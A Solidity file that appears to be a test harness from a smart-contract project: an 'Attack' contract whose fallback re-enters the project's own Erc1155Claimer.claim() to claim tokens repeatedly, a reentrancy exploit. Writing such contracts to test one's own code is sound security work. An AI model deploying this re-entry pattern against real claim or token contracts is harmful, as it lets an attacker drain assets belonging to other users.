// SPDX-License-Identifier: MIT
/* Created by 3Tech Studio
 * @author dev.andreavendrame@gmail.com
 *
 *  _____ _____         _       _____ _             _ _
 * |____ |_   _|       | |     /  ___| |           | (_)
 *     / / | | ___  ___| |__   \ `--.| |_ _   _  __| |_  ___
 *     \ \ | |/ _ \/ __| '_ \   `--. \ __| | | |/ _` | |/ _ \
 * .___/ / | |  __/ (__| | | | /\__/ / |_| |_| | (_| | | (_) |
 * \____/  \_/\___|\___|_| |_| \____/ \__|\__,_|\__,_|_|\___/
 *
 */
pragma solidity ^0.8.19;

import "./Erc1155Claimer.sol";
import {ERC1155} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "hardhat/console.sol";

contract Attack {
    address private claimerAddress;
    address private erc1155Address;
    uint256 private tokenId;

    constructor(
        address _claimerAddress,
        address _erc1155Address,
        uint256 _tokenId
    ) {
        claimerAddress = _claimerAddress;
        erc1155Address = _erc1155Address;
        tokenId = _tokenId;
    }

    function claim(Erc1155Claimer.ClaimType claimType, uint256 eventId)
        public
        payable
    {
        Erc1155Claimer claimer = Erc1155Claimer(claimerAddress);
        claimer.claim(claimType, eventId);
    }

    /**
     * @dev Receive native currency fallback.
     *      Called when msg.data is NOT empty
     */
    fallback() external payable {
        Erc1155Claimer claimer = Erc1155Claimer(claimerAddress);
        if (IERC1155(erc1155Address).balanceOf(claimerAddress, 0) > 0) {
            claimer.claim(Erc1155Claimer.ClaimType.SIMPLE, 1);
        }
    }
}
